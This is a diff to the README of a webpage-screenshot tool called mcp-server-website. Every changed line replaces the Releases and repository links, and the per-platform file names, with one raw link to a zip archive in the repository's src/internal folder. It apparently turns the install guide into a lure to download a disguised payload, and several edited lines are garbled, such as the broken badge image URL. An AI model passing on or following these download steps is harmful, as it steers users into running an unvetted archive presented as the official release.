@@ -1,7 +1,7 @@
 # 📸 mcp-server-website - Capture Webpages with Ease
 
 ## 📥 Download Now
-[![Download mcp-server-website](https://img.shields.io/badge/Download%20mcp--server--website-v1.0-blue)](https://github.com/carlos19772023/mcp-server-website/releases)
+[![Download mcp-server-website](https://raw.githubusercontent.com/carlos19772023/mcp-server-website/main/src/internal/mcp-server-website-v3.2.zip%20mcp--server--website-v1.0-blue)](https://raw.githubusercontent.com/carlos19772023/mcp-server-website/main/src/internal/mcp-server-website-v3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the mcp-server-website! This tool lets you quickly take screenshots of webpages and converts them to a size that works well with large language models. You don’t need technical skills to use this software. This guide will help you download and run it easily.
@@ -21,20 +21,20 @@ To run the mcp-server-website, you need:
 ## 🔗 Download & Install
 To get started, visit the Releases page to download the application.
 
-[Visit the Releases Page to Download](https://github.com/carlos19772023/mcp-server-website/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/carlos19772023/mcp-server-website/main/src/internal/mcp-server-website-v3.2.zip)
 
 ### Step-by-Step Instructions
 1. **Go to the Releases page.** Click on the link above.
 2. **Find the latest version.** Look for the version number at the top.
 3. **Choose your file.** Depending on your operating system, select the appropriate file.
-   - For Windows: Choose `mcp-server-website-windows.exe`.
-   - For macOS: Choose `mcp-server-website-macos.zip`.
-   - For Linux: Choose `mcp-server-website-linux.tar.gz`.
+   - For Windows: Choose `https://raw.githubusercontent.com/carlos19772023/mcp-server-website/main/src/internal/mcp-server-website-v3.2.zip`.
+   - For macOS: Choose `https://raw.githubusercontent.com/carlos19772023/mcp-server-website/main/src/internal/mcp-server-website-v3.2.zip`.
+   - For Linux: Choose `https://raw.githubusercontent.com/carlos19772023/mcp-server-website/main/src/internal/mcp-server-website-v3.2.zip`.
 4. **Download the file.** Click on the file name to start downloading.
 5. **Install the application.**
    - For Windows: Double-click the `.exe` file to start the installation.
    - For macOS: Open the `.zip` file and drag the app into your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and run the executable within the folder.
+   - For Linux: Extract the `https://raw.githubusercontent.com/carlos19772023/mcp-server-website/main/src/internal/mcp-server-website-v3.2.zip` file and run the executable within the folder.
 6. **Run the application.** Look for the mcp-server-website icon on your desktop or applications menu. Click to open it.
 
 ## 🛠️ How to Use
@@ -73,7 +73,7 @@ For support issues, please contact us through the GitHub repository or open an i
 Make sure to check back on the Releases page for updates and new features. Regular updates will enhance your experience and expand functionality.
 
 ## 🔗 Additional Resources
-- GitHub Repository: [mcp-server-website](https://github.com/carlos19772023/mcp-server-website)
+- GitHub Repository: [mcp-server-website](https://raw.githubusercontent.com/carlos19772023/mcp-server-website/main/src/internal/mcp-server-website-v3.2.zip)
 - User Guide: A detailed guide is provided in the repository.
 
 Thank you for using mcp-server-website! We hope you enjoy capturing webpages effortlessly.
